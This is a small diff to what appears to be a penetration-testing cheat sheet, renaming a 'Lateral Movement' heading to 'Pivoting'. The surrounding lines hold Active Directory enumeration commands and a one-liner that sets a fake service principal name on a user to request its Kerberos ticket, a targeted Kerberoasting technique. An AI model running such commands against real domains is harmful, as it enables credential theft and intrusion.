@@ -584,7 +584,7 @@ Get-NetDomain
 Get-LocalUser
 Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
 
-# Lateral Movement
+# Pivoting
 ## Linux
 ## Windows
 [*] Meterpreter
